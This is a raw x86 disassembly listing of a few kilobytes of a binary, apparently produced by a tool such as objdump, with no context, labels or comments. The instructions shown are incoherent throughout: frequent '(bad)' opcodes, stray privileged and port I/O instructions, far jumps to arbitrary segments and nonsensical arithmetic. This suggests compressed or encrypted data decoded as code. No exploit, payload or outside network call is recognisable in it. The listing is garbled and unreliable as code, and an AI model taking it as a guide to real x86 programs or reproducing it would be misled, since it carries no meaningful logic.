  419940:	repz dec esi
  419942:	sahf   
  419943:	sub    al,0x56
  419945:	jl     0x419994
  419947:	push   eax
  419948:	aaa    
  419949:	inc    ebp
  41994a:	lods   al,BYTE PTR ds:[esi]
  41994b:	dec    edx
  41994c:	test   BYTE PTR ds:0xc9eb4770,cl
  419952:	shl    WORD PTR [edx],cl
  419955:	cmp    ebp,ebp
  419957:	push   esi
  419958:	sti    
  419959:	sar    edi,cl
  41995b:	jb     0x41990d
  41995d:	sub    BYTE PTR [edi+0x13a4e8a5],cl
  419963:	popa   
  419964:	aad    0x1a
  419966:	pop    esp
  419967:	repnz ficomp DWORD PTR [ebx+0x52]
  41996b:	xchg   BYTE PTR [esi-0x5],cl
  41996e:	mov    dl,0xf6
  419970:	cmp    ebp,0x73
  419973:	inc    edi
  419974:	jl     0x4199d7
  419976:	int3   
  419977:	ficomp DWORD PTR [edx]
  419979:	imul   edi,DWORD PTR [eax+0x24],0x1f
  41997d:	xor    al,0x24
  41997f:	or     BYTE PTR [ebx+0x10],0x14
  419983:	inc    si
  419985:	cmp    BYTE PTR [eax],dl
  419987:	jns    0x4199fe
  419989:	or     DWORD PTR [ecx+0x27d8c540],0x969a9ec7
  419993:	mov    ebp,0x34be002d
  419998:	fst    DWORD PTR [edx-0x5189c342]
  41999e:	push   ss
  41999f:	inc    eax
  4199a0:	aaa    
  4199a1:	leave  
  4199a2:	(bad)  
  4199a4:	rcl    BYTE PTR [edx+0x3405d97f],cl
  4199aa:	ret    0x1f95
  4199ad:	sub    edx,0xffffff8f
  4199b0:	pop    ebp
  4199b1:	or     DWORD PTR [eax+0x73],eax
  4199b4:	and    BYTE PTR [eax+0x2c],cl
  4199b7:	aam    0x19
  4199b9:	jecxz  0x41997b
  4199bb:	add    DWORD PTR [esi],ecx
  4199bd:	dec    ecx
  4199be:	mov    ch,0xa4
  4199c0:	jb     0x4199fa
  4199c2:	mov    dh,0xfc
  4199c4:	or     BYTE PTR [esi+0x7b],cl
  4199c7:	dec    edx
  4199c8:	mov    ds:0xe2e6d4bc,al
  4199cd:	arpl   WORD PTR [edi],di
  4199cf:	sar    DWORD PTR [esi-0x40],cl
  4199d2:	stos   DWORD PTR es:[edi],eax
  4199d3:	cs fwait
  4199d5:	dec    esi
  4199d6:	xchg   ebx,eax
  4199d7:	loope  0x419989
  4199d9:	dec    edx
  4199da:	test   BYTE PTR [edi-0x41a433a0],dl
  4199e0:	into   
  4199e1:	inc    edx
  4199e2:	xchg   DWORD PTR [esi-0x715c21b0],ebp
  4199e8:	xor    eax,esi
  4199ea:	mov    eax,ds:0x4ff3f7ab
  4199ef:	gs or  bl,bh
  4199f2:	push   esp
  4199f3:	loopne 0x419990
  4199f5:	test   BYTE PTR [ebx+0x7d195424],dh
  4199fb:	and    DWORD PTR [edi+0x44],esp
  4199fe:	mov    DWORD PTR [ecx-0x5f],0x1f3e77ba
  419a05:	mov    edi,0x6513d8c3
  419a0a:	rcr    BYTE PTR [esi-0x2becc804],1
  419a10:	stos   BYTE PTR es:[edi],al
  419a11:	add    al,0x96
  419a13:	sti    
  419a14:	jb     0x419a7a
  419a16:	cmc    
  419a17:	and    dl,BYTE PTR [edx+0x79]
  419a1a:	cli    
  419a1b:	lods   al,BYTE PTR ds:[esi]
  419a1c:	inc    edx
  419a1d:	cmp    ecx,DWORD PTR [eax]
  419a1f:	(bad)  
  419a20:	mov    ebp,0xa7b8825a
  419a25:	(bad)  
  419a26:	xor    eax,0x48e90814
  419a2b:	xchg   DWORD PTR [edx+0x3f],ecx
  419a2e:	inc    ebx
  419a2f:	pusha  
  419a30:	mov    bl,0x60
  419a32:	in     eax,dx
  419a33:	lods   al,BYTE PTR ds:[esi]
  419a34:	jl     0x419a20
  419a36:	mov    ch,0x59
  419a38:	(bad)
  419a3c:	add    BYTE PTR [edx+0x77],cl
  419a3f:	xchg   esi,eax
  419a40:	lahf   
  419a41:	fwait
  419a42:	jl     0x4199d2
  419a44:	push   ebp
  419a45:	loope  0x419a98
  419a47:	jmp    0x9d6b:0x890a8ed1
  419a4e:	inc    edi
  419a4f:	mov    DWORD PTR [esi-0x60b79a46],ebx
  419a55:	sbb    al,0x31
  419a57:	lahf   
  419a58:	ins    DWORD PTR es:[edi],dx
  419a59:	push   ebp
  419a5a:	loopne 0x419a5b
  419a5c:	cmp    BYTE PTR [ebx-0x311eb3f8],bh
  419a62:	mov    DWORD PTR [edi-0x5987d68f],esi
  419a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a69:	add    cl,BYTE PTR [eax]
  419a6b:	jmp    0x419a54
  419a6d:	inc    eax
  419a6e:	daa    
  419a6f:	ja     0x419aee
  419a71:	or     ebp,DWORD PTR [eax]
  419a73:	cmp    eax,0x22a0dbd5
  419a78:	pop    ds
  419a79:	ins    DWORD PTR es:[edi],dx
  419a7a:	lahf   
  419a7b:	lock xchg DWORD PTR [ebp-0x264cd57b],edx
  419a82:	mov    ds:0xbe815fc8,al
  419a87:	add    BYTE PTR [esi-0x5d],bh
  419a8a:	jl     0x419a5e
  419a8c:	sbb    eax,0xc1060117
  419a91:	pop    esi
  419a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a93:	cmp    esi,ebp
  419a95:	and    ah,BYTE PTR [esi-0x49]
  419a98:	pop    esp
  419a99:	or     BYTE PTR [edi-0x837000d],bh
  419a9f:	stos   DWORD PTR es:[edi],eax
  419aa0:	bound  esp,QWORD PTR [edi-0x7c]
  419aa3:	dec    esp
  419aa4:	aaa    
  419aa5:	dec    esi
  419aa6:	inc    ebx
  419aa7:	pop    ebp
  419aa8:	test   BYTE PTR [eax+0xcc68de7],al
  419aae:	fwait
  419aaf:	xor    BYTE PTR [ebp+0x6c],bl
  419ab2:	sbb    BYTE PTR [ebp-0x5811c412],0xc2
  419ab9:	test   BYTE PTR [eax-0x38],cl
  419abc:	mov    eax,ds:0xd4ccab1e
  419ac1:	cmp    edi,DWORD PTR ds:0x20eb615a
  419ac7:	mov    esi,0xcd5fd9d
  419acc:	dec    edx
  419acd:	std    
  419ace:	or     eax,DWORD PTR [ecx+0x10]
  419ad1:	mov    edx,0xb5cf732
  419ad6:	sub    al,0x40
  419ad8:	stos   BYTE PTR es:[edi],al
  419ad9:	stc    
  419ada:	nop
  419adb:	outs   dx,DWORD PTR ds:[esi]
  419adc:	ins    BYTE PTR es:[edi],dx
  419add:	push   edi
  419ade:	lahf   
  419adf:	dec    ebp
  419ae0:	dec    esp
  419ae1:	ret    
  419ae2:	das    
  419ae3:	(bad)  
  419ae4:	shr    DWORD PTR [ecx+0x71],0x82
  419ae8:	test   al,0xa2
  419aea:	arpl   WORD PTR [esi-0x10],cx
  419aed:	inc    ebx
  419aee:	adc    DWORD PTR [ecx+0x0],ebp
  419af1:	push   ds
  419af2:	jp     0x419af7
  419af4:	xchg   ebp,edx
  419af6:	add    edx,DWORD PTR [ebx+0x5271193d]
  419afc:	push   0xb9c5a66
  419b01:	pop    ss
  419b02:	pop    ebx
  419b03:	fiadd  WORD PTR [esi]
  419b05:	mov    ecx,0x1962a328
  419b0a:	sub    bh,ah
  419b0c:	aam    0x75
  419b0e:	mov    esi,0x8117560
  419b13:	push   ebx
  419b14:	jnp    0x419aca
  419b16:	out    0x57,eax
  419b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b19:	adc    eax,0xcc56be99
  419b1e:	aaa    
  419b1f:	jg     0x419b5e
  419b21:	mov    al,ds:0x67b39061
  419b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b27:	mov    dh,0x88
  419b29:	scas   eax,DWORD PTR es:[edi]
  419b2a:	lods   eax,DWORD PTR ds:[esi]
  419b2b:	mov    ebp,0xbf3f56e0
  419b30:	xchg   ecx,eax
  419b31:	xor    eax,DWORD PTR [ebx+0x63bd225]
  419b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b38:	mov    eax,ds:0x7454b1e
  419b3d:	xchg   esi,eax
  419b3e:	sub    dl,BYTE PTR [edi]
  419b40:	push   edi
  419b41:	mov    ds:0xf3c33d7c,eax
  419b46:	aam    0x67
  419b48:	sub    al,0xd0
  419b4a:	cs and al,0xe7
  419b4d:	adc    ecx,esp
  419b4f:	cmp    al,0x8e
  419b51:	arpl   WORD PTR [eax-0x1e],cx
  419b54:	imul   ebx,DWORD PTR [esi+eiz*8+0x3153f286],0x4c
  419b5c:	push   ecx
  419b5d:	std    
  419b5e:	add    eax,0xb2c2c3ef
  419b63:	pushf  
  419b64:	ret    0xdf21
  419b67:	dec    edi
  419b68:	clc    
  419b69:	lahf   
  419b6a:	imul   ebp,DWORD PTR [ecx+0x63ce8060],0xc13c5724
  419b74:	daa    
  419b75:	popf   
  419b76:	sub    ch,BYTE PTR [ecx]
  419b78:	std    
  419b79:	(bad)  
  419b7a:	mov    ebx,0x5e13aade
  419b7f:	xor    BYTE PTR [eax],dl
  419b81:	xor    eax,0x37f7c771
  419b86:	cli    
  419b87:	imul   esi,ebp,0xffffffef
  419b8a:	push   ebp
  419b8b:	scas   al,BYTE PTR es:[edi]
  419b8c:	call   0xf1ddc73e
  419b91:	jae    0x419bfa
  419b93:	push   esi
  419b94:	inc    ebx
  419b95:	jg     0x419baf
  419b97:	push   eax
  419b98:	jno    0x419b58
  419b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b9c:	clc    
  419b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b9e:	inc    ebx
  419b9f:	(bad)  
  419ba0:	jbe    0x419ba9
  419ba2:	les    edi,FWORD PTR [ecx-0x67c82188]
  419ba8:	mov    ?,WORD PTR [ecx+0x3c120b92]
  419bae:	sub    ah,dh
  419bb0:	mov    ecx,0x4cb911cd
  419bb5:	xchg   BYTE PTR [edx-0x1d503291],bh
  419bbb:	jl     0x419b80
  419bbd:	inc    ecx
  419bbe:	inc    ebx
  419bbf:	and    al,bl
  419bc1:	outs   dx,BYTE PTR ds:[esi]
  419bc2:	pop    edx
  419bc3:	aaa    
  419bc4:	and    eax,0x7163d11f
  419bc9:	adc    ebx,DWORD PTR ds:0xdf2a00fb
  419bcf:	inc    esp
  419bd0:	out    0x59,eax
  419bd2:	add    BYTE PTR [esi],0xcc
  419bd5:	stos   DWORD PTR es:[edi],eax
  419bd6:	(bad)  
  419bd7:	les    esi,FWORD PTR [ebx-0x58]
  419bda:	fild   WORD PTR [ebp+0x2f]
  419bdd:	aam    0x70
  419bdf:	jne    0x419bb5
  419be1:	repz sub DWORD PTR [ebp-0x7d],edi
  419be5:	ret    0x8d76
  419be8:	retf   
  419be9:	(bad)  [eax-0x3d]
  419bec:	pop    eax
  419bed:	stc    
  419bee:	mov    eax,0x459e3e22
  419bf3:	inc    ebx
  419bf4:	stc    
  419bf5:	mov    fs,WORD PTR [esp+ebx*2-0x5f6dad61]
  419bfc:	push   ebx
  419bfd:	cmp    eax,0x37c4428c
  419c02:	sub    BYTE PTR [ecx-0x5bf35079],al
  419c08:	in     ax,dx
  419c0a:	(bad)  
  419c0c:	cdq    
  419c0d:	jecxz  0x419c4d
  419c0f:	rol    bh,cl
  419c11:	xor    DWORD PTR [edi],edx
  419c13:	mov    esi,DWORD PTR [ecx+eax*2+0x42]
  419c17:	cmc    
  419c18:	adc    al,0xcf
  419c1a:	pop    esi
  419c1b:	or     BYTE PTR [eax],al
  419c1d:	pop    edx
  419c1e:	(bad)  
  419c1f:	je     0x419bad
  419c21:	jmp    0xdf5c5fd1
  419c26:	bound  ebp,QWORD PTR [eax-0x29]
  419c29:	fiadd  DWORD PTR [edx+eax*1+0x7d706a96]
  419c30:	outs   dx,BYTE PTR ds:[esi]
  419c31:	call   0xcc70c609
  419c36:	mov    edx,0x71c68bbe
  419c3b:	push   ecx
  419c3c:	sub    BYTE PTR ds:0x4ab525a0,al
  419c42:	rol    DWORD PTR [edx+0x72],cl
  419c45:	lahf   
  419c46:	daa    
  419c47:	push   ds
  419c48:	mov    bh,0x7
  419c4a:	pop    ss
  419c4b:	pop    es
  419c4c:	cli    
  419c4d:	xchg   edx,eax
  419c4e:	imul   ecx,DWORD PTR [edx+0x75858c21],0x1e94613a
  419c58:	or     cl,BYTE PTR [esi-0x5f9cf806]
  419c5e:	mov    bl,0xfc
  419c60:	add    dl,cl
  419c62:	mov    eax,0x7495ce0
  419c67:	pop    ds
  419c68:	dec    ecx
  419c69:	nop
  419c6a:	out    0xd2,al
  419c6c:	xchg   DWORD PTR [edi],edx
  419c6e:	gs push 0xb45f3e6e
  419c74:	inc    ebx
  419c75:	and    eax,0x1a443079
  419c7a:	inc    eax
  419c7b:	lea    esi,[ebp+0x73]
  419c7e:	dec    ebp
  419c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c80:	fcmovnu st,st(6)
  419c82:	mov    al,ds:0x2d8735c
  419c87:	or     DWORD PTR [edi+eiz*2],esp
  419c8a:	cmp    al,0xdf
  419c8c:	xor    ch,BYTE PTR [ebx+0x20]
  419c8f:	pop    edx
  419c90:	or     ecx,DWORD PTR [esi+0x26479fcf]
  419c96:	les    esp,FWORD PTR [eax]
  419c98:	dec    ebp
  419c99:	scas   eax,DWORD PTR es:[edi]
  419c9a:	mov    ss,edi
  419c9c:	lds    ebp,FWORD PTR [ecx+0x30f77e40]
  419ca2:	dec    esp
  419ca3:	cmp    bh,BYTE PTR [edx-0x191e95eb]
  419ca9:	out    dx,eax
  419caa:	lea    ebx,[edx-0x26900a39]
  419cb0:	outs   dx,BYTE PTR ds:[esi]
  419cb1:	pop    ebp
  419cb2:	sbb    DWORD PTR [esi-0x1a],esi
  419cb5:	add    al,0x9e
  419cb7:	outs   dx,DWORD PTR ds:[esi]
  419cb8:	pop    ebp
  419cb9:	sahf   
  419cba:	movups xmm3,xmm2
  419cbd:	jnp    0x419c44
  419cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cc0:	mov    ecx,0x93e1e963
  419cc5:	retf   
  419cc6:	mov    eax,ds:0x94e2104a
  419ccb:	dec    esp
  419ccc:	out    dx,eax
  419ccd:	int3   
  419cce:	add    edx,DWORD PTR [ebx-0x52403089]
  419cd4:	lds    ebx,FWORD PTR [edx+0x1f]
  419cd7:	mov    edx,0x822a2584
  419cdc:	push   edx
  419cdd:	jo     0x419c7d
  419cdf:	std    
  419ce0:	lds    esp,FWORD PTR [ebx]
  419ce2:	aam    0x5b
  419ce4:	les    esp,FWORD PTR fs:[eax+0x46]
  419ce8:	dec    ecx
  419ce9:	les    eax,FWORD PTR [edi+ecx*4]
  419cec:	push   es
  419ced:	(bad)  [esi]
  419cef:	jnp    0x419d4e
  419cf1:	call   0xf11b:0x8e7b95f1
  419cf8:	and    eax,0x3b740c2a
  419cfd:	scas   al,BYTE PTR es:[edi]
  419cfe:	push   ss
  419cff:	and    BYTE PTR [edi],0x97
  419d02:	sub    DWORD PTR [esi],edx
  419d04:	add    bh,bh
  419d06:	add    BYTE PTR [edi],dl
  419d08:	shr    DWORD PTR [edi+0xcb70e88],1
  419d0e:	inc    ebx
  419d0f:	je     0x419cc3
  419d11:	adc    bl,BYTE PTR [eax]
  419d13:	loopne 0x419ccc
  419d15:	and    al,0x22
  419d18:	mov    ebp,0xb8a445e
  419d1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d1e:	jl     0x419d60
  419d20:	mov    ebp,0xc16c4ed1
  419d25:	push   0xffffffad
  419d27:	jmp    0x1390acd1
  419d2c:	pop    ss
  419d2d:	adc    bl,BYTE PTR [ebp+0x6a]
  419d30:	sbb    bl,BYTE PTR [edi+eax*8]
  419d33:	and    esp,ebp
  419d35:	sbb    eax,0x62c270ca
  419d3a:	sub    BYTE PTR [edi],0x61
  419d3d:	or     al,0x15
  419d3f:	or     cl,ah
  419d41:	push   0x4261908d
  419d46:	adc    BYTE PTR [edx+esi*1],bl
  419d49:	outs   dx,BYTE PTR ds:[si]
  419d4b:	sbb    eax,0xa40aeb60
  419d50:	xchg   edx,eax
  419d51:	jl     0x419d5c
  419d53:	mov    dl,0x75
  419d55:	arpl   WORD PTR [edx+0x2e],bp
  419d58:	sbb    bh,dl
  419d5a:	cmp    al,0xb1
  419d5c:	stc    
  419d5d:	out    dx,eax
  419d5e:	pop    ss
  419d5f:	push   ss
  419d60:	fstp   TBYTE PTR [esi]
  419d62:	cmp    BYTE PTR [ebp+0x59],ah
  419d65:	add    eax,0x8ea039d1
  419d6a:	sahf   
  419d6b:	fist   DWORD PTR [edx-0x4b11f5c3]
  419d71:	call   DWORD PTR [edx]
  419d73:	push   eax
  419d74:	or     eax,0x59350988
  419d79:	(bad)  
  419d7a:	jne    0x419d95
  419d7c:	hlt    
  419d7d:	xchg   edx,eax
  419d7e:	ret    
  419d7f:	pop    ds
  419d80:	xlat   BYTE PTR ds:[ebx]
  419d81:	ss sar bh,1
  419d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d85:	sbb    BYTE PTR [eax-0x467c5952],0x6a
  419d8c:	push   0xd0cb1fc3
  419d91:	push   ebx
  419d92:	sbb    al,BYTE PTR [ecx+0x54add749]
  419d98:	sahf   
  419d99:	sbb    ch,BYTE PTR [ecx-0x6]
  419d9c:	adc    eax,0x3186e504
  419da1:	xchg   esp,eax
  419da2:	inc    ebx
  419da3:	mov    ebp,0xe8edd682
  419da8:	fld    DWORD PTR [edx]
  419daa:	mov    dl,BYTE PTR [ebx]
  419dac:	xor    BYTE PTR [ebx-0x6a34a264],bh
  419db2:	in     eax,0x8
  419db4:	and    BYTE PTR [edi+0x77],dh
  419db7:	fwait
  419db8:	icebp  
  419db9:	rcr    BYTE PTR [esi],0xe5
  419dbc:	dec    ebp
  419dbd:	xchg   esp,eax
  419dbf:	cmp    al,0x7c
  419dc1:	ror    BYTE PTR [edi],cl
  419dc3:	repz (bad) 
  419dc5:	in     eax,0xb7
  419dc7:	push   esi
  419dc8:	neg    DWORD PTR [ecx+ecx*1-0x151d8700]
  419dcf:	jge    0x419e1b
  419dd1:	add    BYTE PTR [edx+ebx*8],cl
  419dd4:	aad    0x99
  419dd6:	fstp   QWORD PTR [edi-0x6c]
  419dd9:	add    al,0x9b
  419ddb:	cwde   
  419ddc:	inc    esi
  419ddd:	jo     0x419e33
  419ddf:	pop    es
  419de0:	pop    esp
  419de1:	mov    DWORD PTR [ebp-0x43643f],esi
  419de7:	mov    edi,0x252c0935
  419dec:	jne    0x419df1
  419dee:	cmp    edx,DWORD PTR [eax]
  419df0:	add    dh,ch
  419df2:	mov    bl,0x27
  419df4:	nop
  419df5:	and    DWORD PTR [ebx-0x4c52d261],esi
  419dfb:	jae    0x419df1
  419dfd:	loopne 0x419df0
  419dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e01:	and    BYTE PTR [ecx],bh
  419e03:	sahf   
  419e04:	add    al,0xd4
  419e06:	in     eax,dx
  419e07:	sbb    bh,bh
  419e09:	adc    bh,BYTE PTR [ebx-0x69]
  419e0c:	sti    
  419e0d:	std    
  419e0e:	ins    BYTE PTR es:[edi],dx
  419e0f:	scas   al,BYTE PTR es:[edi]
  419e10:	inc    ebp
  419e11:	cmp    al,BYTE PTR [eiz*2-0x2970e4db]
  419e18:	add    bh,bl
  419e1a:	mov    BYTE PTR [edx+0x6d309aa7],al
  419e20:	je     0x419df1
  419e22:	mov    eax,ds:0xcca8eefd
  419e27:	mov    cl,0xf6
  419e29:	idiv   dh
  419e2b:	(bad)  
  419e2c:	and    cl,ah
  419e2e:	jno    0x419e4f
  419e30:	cs add bh,ch
  419e33:	ret    0x2730
  419e36:	stos   DWORD PTR es:[edi],eax
  419e37:	jmp    0xbebc:0xddfe21bc
  419e3e:	or     bh,BYTE PTR [ebp-0x469f23a2]
  419e44:	in     al,dx
  419e45:	add    DWORD PTR [ecx+0x3743e3fd],0x425992
  419e4f:	js     0x419dfb
  419e51:	add    ch,dh
  419e53:	cdq    
  419e54:	pop    ebx
  419e55:	push   edx
  419e56:	ins    BYTE PTR es:[edi],dx
  419e57:	imul   ebp,esi,0xfffffffa
  419e5a:	jnp    0x419e71
  419e5c:	adc    eax,0x315f2578
  419e61:	test   bl,0x58
  419e64:	add    esi,ebp
  419e66:	push   ss
  419e67:	add    ch,BYTE PTR [edx]
  419e69:	jle    0x419e48
  419e6b:	repz pop edx
  419e6d:	sbb    cl,ch
  419e6f:	outs   dx,BYTE PTR ds:[esi]
  419e70:	ret    0x7da5
  419e73:	div    DWORD PTR [edx+0x60c3d056]
  419e79:	mov    dh,0x4
  419e7b:	call   0x5333:0x97e87bc6
  419e82:	fld    QWORD PTR [esi+0x33]
  419e85:	cmp    ecx,ebx
  419e87:	rol    DWORD PTR [edx],cl
  419e89:	ins    BYTE PTR es:[edi],dx
  419e8a:	xor    ebp,DWORD PTR [ebx-0x2d]
  419e8d:	sub    eax,0x52728ab9
  419e92:	push   ecx
  419e93:	mov    fs,WORD PTR [eax]
  419e95:	inc    esp
  419e96:	dec    ecx
  419e97:	mov    ecx,0x52268faf
  419e9c:	pusha  
  419e9d:	adc    BYTE PTR [esi-0x5c91e031],bh
  419ea3:	hlt    
  419ea4:	xor    BYTE PTR [ecx],ah
  419ea6:	test   cl,bh
  419ea8:	sahf   
  419ea9:	dec    ebp
  419eaa:	stos   BYTE PTR es:[edi],al
  419eab:	dec    edi
  419eac:	lds    esp,FWORD PTR [edx+0x76]
  419eaf:	mov    esp,0x730bc840
  419eb4:	sbb    DWORD PTR [edx-0x506bb511],ecx
  419eba:	repz rol BYTE PTR [eax],1
  419ebd:	imul   ebx,edi,0x4f
  419ec0:	push   ds
  419ec1:	shl    ah,cl
  419ec3:	in     eax,0xf4
  419ec5:	or     ecx,ebx
  419ec7:	in     eax,dx
  419ec8:	add    eax,0x9ddf5a1c
  419ecd:	jl     0x419e8c
  419ecf:	jmp    0x419e82
  419ed1:	mov    edi,0x3ae5a667
  419ed6:	stc    
  419ed7:	test   al,0x26
  419ed9:	repnz jecxz 0x419f57
  419edc:	push   edx
  419edd:	pusha  
  419ede:	xchg   ebx,esp
  419ee0:	bound  esi,QWORD PTR [ebp-0x7f33a99d]
  419ee6:	mov    ds:0xb159ef2,eax
  419eeb:	sub    dl,bl
  419eed:	lea    esp,[esi+edi*1-0x229a1590]
  419ef4:	cmp    al,0xdf
  419ef6:	lahf   
  419ef7:	aam    0x2d
  419ef9:	leave  
  419efa:	mov    ebp,0xe53ad933
  419eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f00:	adc    dh,ch
  419f02:	nop
  419f03:	sub    edx,eax
  419f05:	inc    esp
  419f06:	xchg   ecx,eax
  419f07:	loop   0x419ebc
  419f09:	(bad)  
  419f0a:	pop    ecx
  419f0b:	mov    bl,0x65
  419f0d:	sbb    BYTE PTR [esi-0x1f],bl
  419f10:	ret    
  419f11:	(bad)  [ebx-0x1c8c060b]
  419f17:	out    0x3d,eax
  419f19:	inc    ecx
  419f1a:	and    al,0x2c
  419f1c:	sub    DWORD PTR [ecx-0x70589efe],esp
  419f22:	stc    
  419f23:	imul   ch
  419f25:	cmp    al,BYTE PTR [edi-0x13de677d]
  419f2b:	or     bl,BYTE PTR ds:0xe0f33270
  419f31:	in     eax,dx
  419f32:	sub    ah,ah
  419f34:	jbe    0x419ef1
  419f36:	push   0x2f
  419f38:	test   DWORD PTR [esi-0x5426e66d],esp
  419f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f3f:	icebp  
  419f40:	push   ecx
  419f41:	mov    fs,WORD PTR [edx+ebx*2]
  419f44:	(bad)  
  419f45:	imul   ecx,DWORD PTR [ecx],0x15
  419f48:	nop
  419f49:	test   DWORD PTR ds:0xef903b6b,eax
  419f4f:	inc    esi
  419f50:	dec    edi
  419f51:	mov    ebx,0x142bac30
  419f56:	das    
  419f57:	mov    cl,0xb0
  419f59:	fld    QWORD PTR [eax+0x1b9f09a7]
  419f5f:	pop    ebp
  419f60:	and    ch,0x2f
  419f63:	js     0x419fd7
  419f65:	sub    edx,ecx
  419f67:	push   0x11
  419f69:	pop    edi
  419f6a:	jp     0x419f33
  419f6c:	imul   esp,DWORD PTR [esi+0x59882a4f],0x72
  419f73:	xor    bl,BYTE PTR [ebp-0x76]
  419f76:	sub    DWORD PTR [esi-0xd],ebx
  419f79:	pop    ss
  419f7a:	sbb    DWORD PTR [ebx+0x7b],0x3
  419f7e:	es add ch,ah
  419f81:	aaa    
  419f82:	call   0x459af271
  419f87:	iret   
  419f88:	ret    
  419f89:	imul   edi,DWORD PTR [ecx+0x71],0xfffffff3
  419f8d:	sub    bl,ah
  419f8f:	xor    bl,BYTE PTR [edx+0xb949963]
  419f95:	xchg   edx,eax
  419f96:	sbb    edx,DWORD PTR [edx+edi*4]
  419f99:	and    ecx,DWORD PTR [eax]
  419f9b:	ins    BYTE PTR es:[edi],dx
  419f9c:	leave  
  419f9d:	push   edi
  419f9e:	mov    al,0xb7
  419fa0:	in     eax,0xe3
  419fa2:	out    dx,al
  419fa3:	sub    al,0xfe
  419fa5:	push   eax
  419fa6:	(bad)  
  419fa7:	push   eax
  419fa8:	pop    ebp
  419fa9:	out    0xfe,eax
  419fab:	and    eax,0x211d9144
  419fb0:	or     DWORD PTR [ecx-0xc1a9876],esp
  419fb6:	cmp    BYTE PTR [edi-0x80],0xc9
  419fba:	(bad)  
  419fbc:	xchg   edi,eax
  419fbd:	pop    ds
  419fbe:	or     BYTE PTR [esi+ebx*2],ah
  419fc1:	mov    dl,0x11
  419fc3:	mov    ah,0x6c
  419fc5:	gs lock enter 0xee6c,0x8e
  419fcb:	mov    edx,0x14fad748
  419fd0:	stos   DWORD PTR es:[edi],eax
  419fd1:	into   
  419fd2:	mov    ds:0xea8120cd,al
  419fd7:	and    eax,0x97b188d9
  419fdc:	add    ecx,esi
  419fde:	addr16 inc ebx
  419fe0:	test   DWORD PTR [ebp+0x73],esi
  419fe3:	and    ah,BYTE PTR [ecx-0x36]
  419fe6:	adc    ah,BYTE PTR [ebx-0x41]
  419fe9:	mov    ds:0xe3d6c78b,eax
  419fee:	enter  0xd96f,0x84
  419ff2:	add    bh,bh
  419ff4:	aas    
  419ff5:	and    cl,BYTE PTR [edx+eiz*2]
  419ff8:	cmp    eax,0xa1edcd93
  419ffd:	aaa    
  419ffe:	adc    DWORD PTR fs:[edx],eax
  41a001:	nop
  41a002:	pop    ecx
  41a003:	dec    eax
  41a004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a005:	adc    edx,DWORD PTR [ecx]
  41a007:	cdq    
  41a008:	fldl2t 
  41a00a:	sbb    esp,DWORD PTR [ebx-0x792304a0]
  41a010:	and    BYTE PTR [edi+0x79],dh
  41a013:	cdq    
  41a014:	pop    esi
  41a015:	mov    dh,0x37
  41a017:	and    dl,BYTE PTR [ecx]
  41a019:	int    0xb7
  41a01b:	retf   0x5c56
  41a01e:	jbe    0x419fda
  41a020:	aad    0x4e
  41a022:	lahf   
  41a023:	jp     0x41a05a
  41a025:	arpl   WORD PTR [eax-0x19],bx
  41a028:	or     eax,0x386c59b2
  41a02d:	pop    edx
  41a02e:	pusha  
  41a02f:	adc    bh,cl
  41a031:	mov    ds:0xa992a028,eax
  41a036:	sbb    eax,0xa918461c
  41a03b:	mov    eax,ds:0x85cb8236
  41a040:	push   eax
  41a041:	push   0xffffffba
  41a043:	lahf   
  41a044:	jmp    0x41a085
  41a046:	je     0x41a009
  41a048:	das    
  41a049:	dec    esp
  41a04a:	iret   
  41a04b:	js     0x41a015
  41a04d:	pop    edi
  41a04e:	add    bl,BYTE PTR [eax]
  41a050:	scas   eax,DWORD PTR es:[edi]
  41a051:	pop    eax
  41a052:	call   0x2466:0xb4043efb
  41a059:	mul    esi
  41a05b:	mov    bh,0x50
  41a05d:	sbb    eax,0x3c50079a
  41a062:	pslld  mm7,QWORD PTR [esi+ebx*2-0x4d6911d7]
  41a06a:	cmp    DWORD PTR [eax-0x3fe57583],edi
  41a070:	test   eax,0xe5288132
  41a075:	dec    edx
  41a076:	stos   DWORD PTR es:[edi],eax
  41a077:	loopne 0x41a0bf
  41a079:	add    cl,BYTE PTR [edx+0x61c1c787]
  41a07f:	adc    dl,BYTE PTR gs:[ecx]
  41a082:	pop    esi
  41a083:	mov    esi,0x33d02dca
  41a088:	and    edx,DWORD PTR [edi]
  41a08a:	xchg   esp,eax
  41a08b:	push   ebp
  41a08c:	sub    al,0x58
  41a08e:	lock pop ds
  41a090:	add    ebp,ebp
  41a092:	sub    al,0x54
  41a094:	xor    al,BYTE PTR [edi+0x0]
  41a097:	repnz sbb DWORD PTR [ebx],eax
  41a09a:	jmp    DWORD PTR [ecx-0x5a]
  41a09d:	adc    BYTE PTR [ecx+0x5ae8679b],al
  41a0a3:	adc    ah,BYTE PTR [ebx+edx*2+0x12f9fe04]
  41a0aa:	stos   DWORD PTR es:[edi],eax
  41a0ab:	leave  
  41a0ac:	js     0x41a0a8
  41a0ae:	xor    DWORD PTR [esp-0x2a],0x6f844afc
  41a0b6:	xor    esp,ebp
  41a0b8:	adc    BYTE PTR [eax-0x77],cl
  41a0bb:	inc    esp
  41a0bc:	sar    al,0xea
  41a0bf:	xor    DWORD PTR [ecx+0x4d],esi
  41a0c2:	xlat   BYTE PTR ds:[ebx]
  41a0c3:	xchg   edx,eax
  41a0c4:	push   ecx
  41a0c5:	sbb    BYTE PTR [edi+0x266a900e],cl
  41a0cb:	pop    ebx
  41a0cc:	xchg   DWORD PTR [ecx],esp
  41a0ce:	fwait
  41a0cf:	inc    ecx
  41a0d0:	mov    esi,0x11b872a8
  41a0d5:	inc    esi
  41a0d6:	stos   BYTE PTR es:[edi],al
